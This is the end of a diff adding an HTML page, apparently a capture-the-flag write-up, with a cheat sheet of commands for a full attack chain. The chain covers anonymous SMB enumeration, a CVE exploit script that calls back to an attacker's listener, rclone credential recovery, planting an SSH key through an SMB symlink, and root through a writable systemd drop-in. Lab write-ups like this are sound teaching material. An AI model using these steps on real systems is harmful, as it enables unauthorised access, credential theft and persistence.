+    <tr><td>Root</td><td>Group-writable systemd drop-in, <code>ExecStartPre</code> as root</td><td>systemctl</td></tr>
+  </table>
+
+  <!-- ══ COMMAND REF ══ -->
+  <h2>Key commands</h2>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">quick reference</span>
+    </div>
+    <div class="term-body"><span class="pco"># Enumeration</span>
+<span class="pc">smbclient -L //&lt;IP&gt; -N</span>
+<span class="pc">rpcclient -U "" -N &lt;IP&gt;</span>
+
+<span class="pco"># CVE-2026-4480 foothold</span>
+<span class="pc">python3 cve-2026-4480.py -r &lt;IP&gt; -l &lt;LHOST&gt; -p &lt;LPORT&gt;</span>
+
+<span class="pco"># Credential recovery</span>
+<span class="pc">rclone reveal &lt;obfuscated-string&gt;</span>
+
+<span class="pco"># SMB symlink key injection</span>
+<span class="pc">ln -s /home/&lt;user&gt; /srv/transfer/&lt;user&gt;</span>
+<span class="pc">smbclient //&lt;IP&gt;/transfer -U '&lt;user&gt;%&lt;pass&gt;'</span>
+<span class="pc">  put id_rsa.pub authorized_keys</span>
+<span class="pc">  setmode authorized_keys a-r</span>
+
+<span class="pco"># systemd drop-in privesc</span>
+<span class="pc">find / -group &lt;group&gt; 2&gt;/dev/null</span>
+<span class="pc">systemctl daemon-reload &amp;&amp; systemctl restart &lt;unit&gt;</span></div>
+  </div>
+
+</div>
+
+<footer>
+  <span>© 2026 <a href="https://sp1r4.github.io/index.html">NOCTIS</a> — SP1R4</span>
+  <span><a href="https://sp1r4.github.io/blog.html">← All posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
